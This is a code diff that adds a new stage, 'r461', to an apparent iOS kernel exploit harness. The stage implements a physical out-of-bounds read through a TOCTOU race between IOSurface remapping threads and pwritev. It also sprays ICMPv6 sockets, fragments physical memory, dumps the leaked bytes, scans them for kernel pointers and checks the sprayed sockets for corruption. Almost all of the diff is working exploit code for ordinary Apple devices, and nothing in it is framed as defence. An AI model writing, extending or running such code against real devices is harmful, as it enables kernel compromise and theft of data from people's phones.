@@ -17286,6 +17286,335 @@ static void r460_exploit(void) {
     #undef R460_ICMP_SPRAY
 }
 
+/* r461: Physical OOB via multi-page TOCTOU — correct DarkSword mechanism
+ *
+ * Key insight: IOSurface must be MULTI-PAGE so the kernel's PHYS_CONTIG
+ * linear copy from phys_page(0) of non-contiguous remap backing overshoots
+ * into adjacent physical memory.
+ *
+ * Uses pwritev (memory→file) to READ adjacent physical memory:
+ *   - 3-page IOSurface (PurpleGfxMem, physically contiguous)
+ *   - 3-page remap backing (anonymous, physically scattered)
+ *   - TOCTOU race: kernel treats remap backing as contiguous
+ *   - Linear read from phys_page(0) for 3 pages → pages 1-2 come from
+ *     adjacent physical memory, not remap pages 1-2
+ *   - That data ends up in the file → read file to see adjacent phys mem
+ */
+struct r461_ctx {
+    volatile int go;
+    volatile int stop;
+    volatile int remap_count;
+    mach_vm_address_t target;
+    mach_vm_size_t size;
+    mach_port_t mem_entry;
+};
+
+static void *r461_remap_thread(void *arg) {
+    struct r461_ctx *ctx = (struct r461_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    mach_port_t self = mach_task_self();
+    mach_vm_address_t tgt = ctx->target;
+    mach_vm_size_t sz = ctx->size;
+    mach_port_t entry = ctx->mem_entry;
+    while (!ctx->go) { __asm__ volatile("yield"); }
+    while (!ctx->stop) {
+        mach_vm_address_t t = tgt;
+        kern_return_t kr = mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&ctx->remap_count, 1);
+    }
+    return NULL;
+}
+
+static void r461_exploit(void) {
+    rlog("\n=== r461: Physical OOB via multi-page TOCTOU ===\n\n");
+    fflush(stdout);
+
+    #define R461_PAGE_SZ 16384
+    #define R461_SURF_PAGES 3
+    #define R461_SURF_SZ (R461_SURF_PAGES * R461_PAGE_SZ)
+    #define R461_REMAP_THREADS 2
+    #define R461_ITERS 200
+    #define R461_ICMP_SPRAY 2000
+    #define R461_FRAG_PAGES 512
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Phase 1: ICMPv6 spray — fill physical pages with inpcb structs */
+    rlog("  --- Phase 1: ICMPv6 spray (%d sockets) ---\n", R461_ICMP_SPRAY);
+    fflush(stdout);
+    int *icmp_fds = (int *)malloc(R461_ICMP_SPRAY * sizeof(int));
+    int icmp_count = 0;
+    for (int i = 0; i < R461_ICMP_SPRAY; i++) {
+        icmp_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+        if (icmp_fds[i] < 0) break;
+        struct icmp6_filter filt;
+        ICMP6_FILTER_SETBLOCKALL(&filt);
+        ICMP6_FILTER_SETPASS(i & 0xFF, &filt);
+        setsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+        icmp_count++;
+    }
+    rlog("    Sprayed %d ICMPv6 sockets\n", icmp_count);
+
+    /* Phase 2: Physical memory fragmentation — force non-contiguous remap pages */
+    rlog("\n  --- Phase 2: Physical memory fragmentation (%d pages) ---\n", R461_FRAG_PAGES);
+    fflush(stdout);
+    mach_vm_address_t *frag_pages = (mach_vm_address_t *)malloc(R461_FRAG_PAGES * sizeof(mach_vm_address_t));
+    for (int i = 0; i < R461_FRAG_PAGES; i++) {
+        frag_pages[i] = 0;
+        mach_vm_allocate(mach_task_self(), &frag_pages[i], R461_PAGE_SZ, VM_FLAGS_ANYWHERE);
+        memset((void *)frag_pages[i], 0xFF, R461_PAGE_SZ);
+    }
+    /* Free odd pages to create holes */
+    for (int i = 1; i < R461_FRAG_PAGES; i += 2) {
+        mach_vm_deallocate(mach_task_self(), frag_pages[i], R461_PAGE_SZ);
+        frag_pages[i] = 0;
+    }
+    rlog("    Allocated %d, freed %d odd pages\n", R461_FRAG_PAGES, R461_FRAG_PAGES / 2);
+
+    /* Phase 3: 3-page PurpleGfxMem IOSurface (physically contiguous) */
+    rlog("\n  --- Phase 3: PurpleGfxMem IOSurface (%d pages = %d bytes) ---\n",
+         R461_SURF_PAGES, R461_SURF_SZ);
+    fflush(stdout);
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int pw = R461_SURF_SZ, ph = 1, pbpe = 1, ppf = 0x4C303038;
+    CFNumberRef pwn = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+    CFNumberRef phn = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+    CFNumberRef pbn = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
+    CFNumberRef ppn = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), pwn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), phn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), pbn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), ppn);
+    int alloc_sz = R461_SURF_SZ;
+    CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    CFRelease(props); CFRelease(pwn); CFRelease(phn); CFRelease(pbn); CFRelease(ppn); CFRelease(an);
+
+    if (!surf) {
+        rlog("    FAILED to create 3-page IOSurface\n");
+        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+        for (int i = 0; i < R461_FRAG_PAGES; i += 2) {
+            if (frag_pages[i]) mach_vm_deallocate(mach_task_self(), frag_pages[i], R461_PAGE_SZ);
+        }
+        free(frag_pages); free(icmp_fds);
+        rlog("\n=== r461 complete ===\n"); return;
+    }
+    IOSurfaceLock(surf, 0, NULL);
+    void *surf_base = IOSurfaceGetBaseAddress(surf);
+    IOSurfaceUnlock(surf, 0, NULL);
+    rlog("    Surface base=%p alloc=%zu ID=%u\n", surf_base,
+         IOSurfaceGetAllocSize(surf), IOSurfaceGetID(surf));
+
+    /* Phase 4: 3-page remap backing (non-contiguous anonymous memory) */
+    rlog("\n  --- Phase 4: Remap backing (%d pages) ---\n", R461_SURF_PAGES);
+    fflush(stdout);
+    mach_vm_address_t remap_backing = 0;
+    kern_return_t kr = mach_vm_allocate(mach_task_self(), &remap_backing, R461_SURF_SZ, VM_FLAGS_ANYWHERE);
+    /* Fill each page with distinct pattern to detect contiguity */
+    uint8_t *rb = (uint8_t *)remap_backing;
+    memset(rb, 0xBB, R461_PAGE_SZ);
+    memset(rb + R461_PAGE_SZ, 0xCC, R461_PAGE_SZ);
+    memset(rb + 2 * R461_PAGE_SZ, 0xDD, R461_PAGE_SZ);
+
+    memory_object_size_t memsz = R461_SURF_SZ;
+    mach_port_t mem_entry = MACH_PORT_NULL;
+    kr = mach_make_memory_entry_64(mach_task_self(), &memsz, remap_backing,
+        VM_PROT_READ | VM_PROT_WRITE, &mem_entry, MACH_PORT_NULL);
+    rlog("    Remap backing at 0x%llx, mem_entry=0x%x (memsz=%llu)\n",
+         (unsigned long long)remap_backing, mem_entry, (unsigned long long)memsz);
+
+    /* Restore entry for resetting IOSurface mapping between iterations */
+    mach_vm_address_t restore_buf = 0;
+    mach_vm_allocate(mach_task_self(), &restore_buf, R461_SURF_SZ, VM_FLAGS_ANYWHERE);
+    memset((void *)restore_buf, 0xAA, R461_SURF_SZ);
+    memory_object_size_t rsz = R461_SURF_SZ;
+    mach_port_t restore_entry = MACH_PORT_NULL;
+    mach_make_memory_entry_64(mach_task_self(), &rsz, restore_buf,
+        VM_PROT_READ | VM_PROT_WRITE, &restore_entry, MACH_PORT_NULL);
+
+    /* Free remaining fragmentation pages */
+    for (int i = 0; i < R461_FRAG_PAGES; i += 2) {
+        if (frag_pages[i]) mach_vm_deallocate(mach_task_self(), frag_pages[i], R461_PAGE_SZ);
+    }
+    free(frag_pages);
+
+    /* Phase 5: F_NOCACHE file for pwritev */
+    rlog("\n  --- Phase 5: F_NOCACHE file (%d bytes) ---\n", R461_SURF_SZ);
+    fflush(stdout);
+    char tmppath[256];
+    snprintf(tmppath, sizeof(tmppath), "%s/r461_oob", getenv("TMPDIR") ?: "/tmp");
+    int fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    fcntl(fd, F_NOCACHE, 1);
+    /* Pre-fill file with zeros */
+    char *zbuf = (char *)calloc(1, R461_SURF_SZ);
+    pwrite(fd, zbuf, R461_SURF_SZ, 0);
+    free(zbuf);
+    rlog("    File ready: fd=%d\n", fd);
+
+    /* Phase 6: TOCTOU race with pwritev (memory→file) */
+    rlog("\n  --- Phase 6: TOCTOU race + pwritev (%d iters) ---\n", R461_ITERS);
+    fflush(stdout);
+
+    struct r461_ctx ctxs[R461_REMAP_THREADS];
+    pthread_t remap_tids[R461_REMAP_THREADS];
+    for (int t = 0; t < R461_REMAP_THREADS; t++) {
+        memset(&ctxs[t], 0, sizeof(struct r461_ctx));
+        ctxs[t].target = (mach_vm_address_t)(uintptr_t)surf_base;
+        ctxs[t].size = R461_SURF_SZ;
+        ctxs[t].mem_entry = mem_entry;
+        pthread_create(&remap_tids[t], NULL, r461_remap_thread, &ctxs[t]);
+    }
+
+    int oob_hits = 0;
+    int race_hits = 0;
+    for (int t = 0; t < R461_REMAP_THREADS; t++) ctxs[t].go = 1;
+    __sync_synchronize();
+
+    for (int iter = 0; iter < R461_ITERS; iter++) {
+        /* Reset IOSurface mapping to restore_entry (0xAA fill) */
+        mach_vm_address_t rst = (mach_vm_address_t)(uintptr_t)surf_base;
+        mach_vm_map(mach_task_self(), &rst, R461_SURF_SZ, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            restore_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+
+        /* Clear file */
+        lseek(fd, 0, SEEK_SET);
+        char zp[R461_PAGE_SZ];
+        memset(zp, 0x00, sizeof(zp));
+        for (int p = 0; p < R461_SURF_PAGES; p++) pwrite(fd, zp, R461_PAGE_SZ, p * R461_PAGE_SZ);
+
+        /* pwritev: write from surf_base (3 pages) to file */
+        struct iovec wv = { surf_base, R461_SURF_SZ };
+        pwritev(fd, &wv, 1, 0);
+
+        /* Read file back and analyze */
+        uint8_t *readback = (uint8_t *)malloc(R461_SURF_SZ);
+        pread(fd, readback, R461_SURF_SZ, 0);
+
+        /* Page 0: check if race hit (should be 0xBB from remap, not 0xAA from restore) */
+        int page0_bb = 0, page0_aa = 0;
+        for (int j = 0; j < R461_PAGE_SZ; j += 256) {
+            if (readback[j] == 0xBB) page0_bb++;
+            else if (readback[j] == 0xAA) page0_aa++;
+        }
+
+        if (page0_bb > 0) {
+            race_hits++;
+            /* Page 1: should be 0xCC if pages contiguous, something else if physical OOB */
+            int p1_cc = 0, p1_other = 0, p1_zero = 0;
+            for (int j = R461_PAGE_SZ; j < 2 * R461_PAGE_SZ; j += 64) {
+                if (readback[j] == 0xCC) p1_cc++;
+                else if (readback[j] == 0x00) p1_zero++;
+                else p1_other++;
+            }
+            /* Page 2: should be 0xDD if contiguous */
+            int p2_dd = 0, p2_other = 0, p2_zero = 0;
+            for (int j = 2 * R461_PAGE_SZ; j < 3 * R461_PAGE_SZ; j += 64) {
+                if (readback[j] == 0xDD) p2_dd++;
+                else if (readback[j] == 0x00) p2_zero++;
+                else p2_other++;
+            }
+
+            int is_oob = (p1_other > 0 || p2_other > 0);
+            if (is_oob) oob_hits++;
+
+            if (race_hits <= 10 || is_oob) {
+                rlog("    [iter %d] RACE HIT p0=BB  p1: cc=%d other=%d zero=%d  p2: dd=%d other=%d zero=%d %s\n",
+                     iter, p1_cc, p1_other, p1_zero, p2_dd, p2_other, p2_zero,
+                     is_oob ? "*** PHYSICAL OOB ***" : "(contiguous)");
+                if (is_oob) {
+                    /* Dump interesting bytes from pages 1-2 */
+                    rlog("      Page1[0..63]: ");
+                    for (int j = 0; j < 64; j++) {
+                        rlog("%02x", readback[R461_PAGE_SZ + j]);
+                        if (j % 8 == 7) rlog(" ");
+                    }
+                    rlog("\n      Page2[0..63]: ");
+                    for (int j = 0; j < 64; j++) {
+                        rlog("%02x", readback[2 * R461_PAGE_SZ + j]);
+                        if (j % 8 == 7) rlog(" ");
+                    }
+                    rlog("\n");
+                    /* Scan for kernel pointer patterns (0xFFFFFFF0xxxxxxxx) */
+                    int kptrs = 0;
+                    for (int j = R461_PAGE_SZ; j < R461_SURF_SZ - 7; j += 8) {
+                        uint64_t val = *(uint64_t *)(readback + j);
+                        if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            if (kptrs < 5) {
+                                rlog("      Kernel ptr at offset %d: 0x%016llx\n",
+                                     j, (unsigned long long)val);
+                            }
+                            kptrs++;
+                        }
+                    }
+                    if (kptrs > 0) rlog("      Total kernel pointers found: %d\n", kptrs);
+                }
+            }
+        }
+        free(readback);
+    }
+
+    for (int t = 0; t < R461_REMAP_THREADS; t++) ctxs[t].stop = 1;
+    __sync_synchronize();
+    int total_remaps = 0;
+    for (int t = 0; t < R461_REMAP_THREADS; t++) {
+        pthread_join(remap_tids[t], NULL);
+        total_remaps += ctxs[t].remap_count;
+    }
+
+    rlog("\n    Race complete: race_hits=%d, oob_hits=%d / %d iters, remaps=%d\n",
+         race_hits, oob_hits, R461_ITERS, total_remaps);
+
+    /* Phase 7: ICMPv6 corruption check */
+    rlog("\n  --- Phase 7: ICMPv6 corruption check ---\n"); fflush(stdout);
+    int corrupted = 0;
+    for (int i = 0; i < icmp_count; i++) {
+        struct icmp6_filter filt;
+        socklen_t flen = sizeof(filt);
+        int r = getsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, &flen);
+        if (r < 0 || flen != sizeof(filt)) { corrupted++; continue; }
+        struct icmp6_filter expected;
+        ICMP6_FILTER_SETBLOCKALL(&expected);
+        ICMP6_FILTER_SETPASS(i & 0xFF, &expected);
+        if (memcmp(&filt, &expected, sizeof(filt)) != 0) {
+            corrupted++;
+            if (corrupted <= 3) {
+                rlog("    Socket %d CORRUPTED: ", i);
+                uint8_t *fb = (uint8_t *)&filt;
+                for (int j = 0; j < 16; j++) rlog("%02x", fb[j]);
+                rlog("\n");
+            }
+        }
+    }
+    rlog("    Corrupted: %d / %d\n", corrupted, icmp_count);
+
+    /* Cleanup */
+    for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+    free(icmp_fds);
+    close(fd); unlink(tmppath);
+    mach_port_deallocate(mach_task_self(), mem_entry);
+    mach_port_deallocate(mach_task_self(), restore_entry);
+    mach_vm_deallocate(mach_task_self(), remap_backing, R461_SURF_SZ);
+    mach_vm_deallocate(mach_task_self(), restore_buf, R461_SURF_SZ);
+    CFRelease(surf);
+
+    rlog("\n=== r461 complete ===\n");
+
+    #undef R461_PAGE_SZ
+    #undef R461_SURF_PAGES
+    #undef R461_SURF_SZ
+    #undef R461_REMAP_THREADS
+    #undef R461_ITERS
+    #undef R461_ICMP_SPRAY
+    #undef R461_FRAG_PAGES
+}
+
 /* r459: Cross-surface UAF + ICMPv6 heap spray → kernel R/W */
 static void r459_exploit(void) {
     rlog("\n=== r459: Cross-surface UAF + ICMPv6 heap reclaim ===\n\n");
@@ -83947,6 +84276,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 465) {
+            rlog("*** rounds=465: Physical OOB via multi-page TOCTOU ***\n\n");
+            fflush(stdout);
+            r461_exploit();
+            goto done;
+        }
         if (rounds == 464) {
             rlog("*** rounds=464: Physical OOB via TOCTOU — DarkSword path ***\n\n");
             fflush(stdout);
@@ -86752,7 +87087,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
